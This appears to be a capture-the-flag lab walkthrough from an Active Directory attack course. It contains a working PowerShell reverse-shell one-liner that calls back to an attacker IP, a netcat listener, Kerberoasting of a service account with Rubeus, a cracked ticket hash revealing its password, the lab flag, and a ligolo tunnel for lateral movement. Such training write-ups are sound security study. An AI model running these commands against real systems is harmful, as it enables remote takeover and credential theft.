# Notes

## Rev Shell

Got rev shell from the webshell with the following:

**from webshell**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.65',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**on attack host**
```bash
rlwrap nc -lnvp 4444
```


## Enum of init foothold


```
PS C:\windows\system32\inetsrv> whoami /all                                                                                                                                     08:40 [1/61]

USER INFORMATION
----------------

User Name           SID
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                           Attributes
====================================== ================ ============================================================= ==================================================
Mandatory Label\System Mandatory Level Label            S-1-16-16384
Everyone                               Well-known group S-1-1-0                                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                      Alias            S-1-5-32-568                                                  Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                                       Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\DefaultAppPool             Well-known group S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                 Alias            S-1-5-32-544                                                  Enabled by default, Enabled group, Group owner


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeTcbPrivilege                Act as part of the operating system       Enabled
SeBackupPrivilege             Back up files and directories             Disabled
SeRestorePrivilege            Restore files and directories             Disabled
SeDebugPrivilege              Debug programs                            Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

```
PS C:\windows\system32\inetsrv> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : WEB-WIN01
   Primary Dns Suffix  . . . . . . . : INLANEFREIGHT.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : INLANEFREIGHT.LOCAL
                                       htb

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : 00-50-56-8A-61-98
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::4138:823a:5ad8:a7f7%7(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.6.100(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.6.1
   DHCPv6 IAID . . . . . . . . . . . : 167792726
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-31-80-5D-35-00-50-56-8A-0B-6D
   DNS Servers . . . . . . . . . . . : 172.16.6.3
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-8A-0B-6D
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::e6(Preferred)
   Lease Obtained. . . . . . . . . . : Sunday, April 26, 2026 4:50:54 PM
   Lease Expires . . . . . . . . . . : Sunday, April 26, 2026 6:20:54 PM
   IPv6 Address. . . . . . . . . . . : dead:beef::38b7:cb45:964e:2319(Preferred)
   Link-local IPv6 Address . . . . . : fe80::38b7:cb45:964e:2319%3(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.129.81.83(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Sunday, April 26, 2026 4:50:57 PM
   Lease Expires . . . . . . . . . . : Sunday, April 26, 2026 6:20:54 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe8a:f92c%3
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 100683862
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-31-80-5D-35-00-50-56-8A-0B-6D
   DNS Servers . . . . . . . . . . . : 127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb
```

```
PS C:\windows\system32\inetsrv> nltest /dsgetdc:INLANEFREIGHT
           DC: \\DC01
      Address: \\172.16.6.3
     Dom Guid: a9fc86ba-4427-40cd-839b-0efb14e07318
     Dom Name: INLANEFREIGHT
  Forest Name: INLANEFREIGHT.LOCAL
 Dc Site Name: Default-First-Site-Name
Our Site Name: Default-First-Site-Name
        Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10
The command completed successfully
```

Got flag from Administrator's desktop

```
PS C:\windows\system32\inetsrv> type c:\Users\Administrator\Desktop\flag.txt
JusT_g3tt1ng_st@rt3d!
```

```
PS C:\windows\system32\inetsrv> setspn -T INLANEFREIGHT.LOCAL -F -Q MSSQLSvc/SQL01.inlanefreight.local:1433

Checking forest DC=INLANEFREIGHT,DC=LOCAL
CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL01.inlanefreight.local:1433

Existing SPN found!
```

Got the ticket for `svc_sql` via Rubeus

```
PS C:\Windows\Temp> ./Rubeus kerberoast /user:svc_sql /outfile:C:\Windows\Temp\svc_sql.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : svc_sql
[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : MSSQLSvc/SQL01.inlanefreight.local:1433
[*] PwdLastSet             : 3/30/2022 9:14:52 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Windows\Temp\svc_sql.txt

[*] Roasted hashes written to : C:\Windows\Temp\svc_sql.txt
```

Cracked the hash using hashcat and rockyou.txt wordlist.

```
┌──(openclaw㉿srv1405873)-[~/.openclaw/workspace-neo/htb/academy/ad-enumeration-attacks/raw_data]
└─$ hashcat -m 13100 svc_sql.txt --show
$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$4c5d80433fc5f826472998de7118bf03$362cd9392c86c007e54cbfa95724f11b671752c39f200e3ffe2b6a2749f8f24e0884da4c11d65e77e6e19e20e014107a4c06b7dc96ceec4af27d782ceaf34cf16e285b3d66f5788768b4dffcd263d7ecd61a6654f8f03b6e17270964ae2d64f4066df5a842ad7bc14a45dbaa469395df60909e56e56a940e395f6649f5bf08973a9ec2f8caccb1b5875c13a4d8c499439701a726a1d93dabcaebb0ffa7ab363f591f3fa04903241b1b9f73706d011049a5d88fe5a58754e668367d7b258ef451e7c752133db386c4d96802970414c70a353b4bcfa9c64b46a727113c10188c3b153ea6940b122a13f26e8a8a633b59a590b7f87861b4db0e5991fcb5caf532f3bae8d5563a15989c584c51871010223a49dda450f2698de8139fe719ea5d3882ade91c325a4e0a88fc20ff0b5bc51a5fad5e3cfb1e8779dae806276d6f2466c29480c0d9defa9dba1fe2ddf3f9834bc9c68bc9f0e428d939577fe0c18fac69c57b7fa216a8587ec2c69ee8e4315f1451400cf13122c030ba3124bb2baca350f301e79b9d13336baa9a959e177a7eedef2d6eacbf917ee29e412f253d4e717a0fbc0d6cac32e955719a444b5bad6564cbe26567b2722e07aacbae32e67b9ae6a6aedd949c7d06cb292956ae8884b126db7055320317b5dc5f5063ad087b5ef47204a24a8f9edde13e736d91d90a9f5d094165e9019e311cb98e6794faca70d287c54ab0f680f1effe782225361345f442f015adfc9476b3e5d94b1797692db056daca4e4c19e9be2785bc1c8de8d1413cf9defe1b40d01525ca2be89b3183c419445257b73abfa2ec1f1a8d028c9c09dd6358384c53c2d429a49081371df572b1853c55b56dd5a341b2d3d221a1a126e8a34817a8121ddf31853dd7dc57be9baae00c035fefb879770f52bd93365add010f52632a70d9ea3f5110967f01f7c1b179abc466f8a5b4b0c9aba6490563dc59b87de87efbe4d80153b2cf51ccd057c450fe3f83032c1a7a70754693f5d18e8b932acef474186ce497a52413604896d7adaca54206dcb5cb56192058f3ee0ee0c7422f2f2cae08ca7f04f4d39b59d306f323dc4eaf1431b2aea5b0d47023eadf414c4c95d1b4ee9b86ca4a31b9386f8a168fc6b467364e8e2a6d10c2f6593331efa9f4cc26ee17be4d4d8f1f97a0cb863240d886ef4b389976d9d3610bc36acb635c36a258e670a23842b86ef9dda3291ed6e77714e7e9a0291de2e8d225c1cc739a80ee0a5b039dfc6fdd97e639cb4c7a1ea790549e2b9aeaf3e76489f1b6eb82043177669b03b1fd342050be494cce161a76b2a5d6e4aacef74b04b1efbbeff5fc701527142072617a59d58f9ca790e1370335e2e010897d47b5eba1ab0f3a4f518c1bfd1f4ff9e1145c25ca6d468cf4316d86435f79ed6e22d270b8943879c4a0ba3e52bbf8cd0a9cba84598d4255169d12876237d446a27eb407b51be23eca7692f5446398175940d231ee0d423cdd0fc7cbe821d36d5294420a8feb137dfebfcfc761955026:lucky7
```

Find `MS01`

```
PS C:\Windows\Temp> nslookup MS01.inlanefreight.local
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  172.16.6.3

Name:    MS01.inlanefreight.local
Address:  172.16.6.50
```

Setup tunnel via ligolo. Tested that `MS01` ip is reachable from attack host.

```
└─$ ping 172.16.6.50
PING 172.16.6.50 (172.16.6.50) 56(84) bytes of data.
64 bytes from 172.16.6.50: icmp_seq=1 ttl=64 time=196 ms
64 bytes from 172.16.6.50: icmp_seq=2 ttl=64 time=194 ms
```